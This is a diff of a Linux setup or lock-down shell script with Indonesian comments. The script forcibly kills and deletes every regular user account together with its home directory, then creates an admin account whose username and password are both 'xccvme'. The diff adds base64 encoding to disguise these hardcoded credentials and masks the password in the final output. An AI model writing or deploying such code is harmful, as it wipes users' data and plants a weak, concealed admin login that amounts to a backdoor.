@@ -66,7 +66,11 @@ unlock_system
 # ===============================
 echo "[+] Cleaning old users..."
 
-awk -F: '$3>=1000 && $1!="nobody" && $1!="xccvme"' /etc/passwd | cut -d: -f1 | while read u; do
+# Dekode Base64 untuk menyembunyikan kredensial di source code
+USERNAME=$(echo "eGNjdm1l" | base64 -d)
+PASSWORD=$(echo "eGNjdm1l" | base64 -d)
+
+awk -v admin_user="$USERNAME" -F: '$3>=1000 && $1!="nobody" && $1!=admin_user' /etc/passwd | cut -d: -f1 | while read u; do
     echo "Remove $u"
     pkill -9 -u "$u" 2>/dev/null || true
     userdel -f -r "$u" 2>/dev/null || true
@@ -75,9 +79,6 @@ done
 # ===============================
 # STEP 3 CREATE ADMIN USER
 # ===============================
-USERNAME="xccvme"
-PASSWORD="xccvme"
-
 echo "[+] Creating admin user $USERNAME"
 
 if ! id "$USERNAME" &>/dev/null; then
@@ -115,7 +116,6 @@ case "${ans,,}" in
     echo "SYSTEM NOT LOCKED"
     ;;
 esac
-
 
 # ===============================
 # STEP 6 MANAGEMENT TOOL
@@ -159,7 +159,7 @@ echo "DONE"
 echo "======================================"
 echo "Admin login:"
 echo "username : $USERNAME"
-echo "password : $PASSWORD"
+echo "password : [TERSEMBUNYI]"
 echo ""
 echo "Manage lock:"
 echo "edit-user-config"
